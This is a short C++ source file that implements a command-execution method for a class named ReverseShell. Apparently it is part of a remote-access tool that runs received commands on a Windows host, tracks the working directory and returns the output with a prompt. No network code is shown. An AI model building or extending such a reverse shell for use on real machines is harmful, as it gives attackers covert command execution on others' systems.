#include "ReverseShell.h"
#include "../converter/Converter.h"


std::string ReverseShell::executeCommand(const std::wstring & command) {
    std::array<char, 128> buffer{};
    std::string result;
    std::wstring completeCommand = L"cd "+currentDirectory+L" && "+command+L" && cd";
    std::unique_ptr<FILE, decltype(&pclose)> pipe(_wpopen(completeCommand.c_str(), L"r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    size_t initialPos =  result.find_last_of('\n',result.find_last_not_of('\n'));
    std::string currentDirectorySubstring =  result.substr(initialPos+1,result.length()-initialPos-2);
    currentDirectory = Converter::string2wstring(currentDirectorySubstring);
    result.pop_back();
    result.append(">");
    return result;
}

